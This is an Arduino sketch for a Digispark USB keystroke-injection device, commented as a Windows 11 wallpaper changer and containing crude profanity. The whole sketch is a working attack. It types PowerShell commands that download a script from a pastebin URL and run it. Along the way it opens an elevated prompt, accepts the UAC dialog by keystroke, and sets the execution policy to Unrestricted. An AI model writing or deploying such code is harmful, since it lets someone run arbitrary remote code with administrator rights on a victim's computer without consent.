// Changes wallpaper to whatever you want.
// Tested working Windows 11. 
// Change the link to the image you want to use in jpg form.
// TODO better way to get into powershell this shit takes up so much memory
// comment this shitty ass fucked balls and also the script.ps1 lazy cunt
#include "DigiKeyboard.h"
#define KEY_DOWN 0x51
void setup() {
  pinMode(1, OUTPUT); // LED Setup
}
void loop() {
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); // Turn on LED to signify task started
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("$path = \"$env:USERPROFILE\\script2.ps1\"");
  DigiKeyboard.println("$client = new-object System.Net.WebClient");
  DigiKeyboard.println("Remove-Item $path -ErrorAction SilentlyContinue");
  DigiKeyboard.delay(500);
  // MAKE SURE TO UPDATE THIS PASTEBIN ACCORDING TO THE SCRIPT.PS1
  DigiKeyboard.println("$client.DownloadFile(\"https://pastebin.com/raw/GaccCRrz\", $path)");
  DigiKeyboard.delay(4000);

  DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
  DigiKeyboard.delay(750);

  DigiKeyboard.println("powershell.exe -File \"%USERPROFILE%\\script2.ps1\"");

  digitalWrite(1, LOW);
  for(;;){}
}
